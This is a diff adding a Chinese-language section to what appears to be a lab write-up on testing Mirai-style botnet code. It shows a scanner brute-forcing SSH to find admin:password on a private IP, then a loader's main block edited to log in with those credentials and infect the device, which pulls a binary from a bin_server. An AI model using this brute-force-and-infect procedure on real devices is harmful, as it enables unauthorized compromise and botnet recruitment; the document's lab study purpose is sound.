@@ -250,3 +250,31 @@ if __name__ == '__main__':
 python3 scanner.py
 ```
 如下圖
+
+![](../image/Mirai_test/scanner.jpg)
+
+可以看到Scanner針對該IP位置搜尋，並且成功在SSH中暴力解出帳號為admin密碼為password，並且將該資訊傳遞給relay接收新增
+
+在前述有說到，我們在攻擊者電腦上並沒有將Scanner與Loader整合自動感染，這是為了方便獲取各自的結果，因此如果要進行感染，需要在手動將資訊帶入到Loader.py中執行。
+
+在此，可以到loader.py中找到```__main__```，其中，因為Scanner得知是使用SSH並且利用```admin:password```組合登入，因此修改成如下。帶入相關參數進行執行。
+
+```
+if __name__ == '__main__':
+    #Host_IP, targerIP = read_config_ip()
+    #ForceDB(sys.argv[2])
+    #doTelnetLogin("192.168.6.121", "23", "root", "password")
+    #doTelnetLogin("192.168.0.1","23","","")
+    doSSHLogin("192.168.6.163","22","admin","password")  # Use this
+    pass
+```
+
+並且執行
+
+```
+python3 loader.py
+```
+
+如下結果，右邊可以看到被感染後，裝置正向bin_server索取檔案下載，並且可以到裝置中看到被感染後結果。
+
+![](../image/Mirai_test/binfile.gif)
